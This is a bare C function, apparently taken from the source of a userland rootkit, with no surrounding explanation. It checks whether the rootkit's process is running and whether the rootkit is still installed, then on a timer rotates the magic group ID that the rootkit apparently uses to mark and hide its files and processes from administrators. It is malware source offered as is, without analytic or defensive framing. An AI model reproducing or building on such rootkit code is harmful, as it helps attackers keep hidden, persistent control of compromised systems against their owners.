void gidchanger(void){
    if(getgid()==readgid() || rkprocup() || rknomore(INSTALL_DIR, BDVLSO))
        return;

    int curtime = time(NULL);
    if(itistime(GIDTIME_PATH, curtime, GID_CHANGE_MINTIME))
        changerkgid(curtime);
}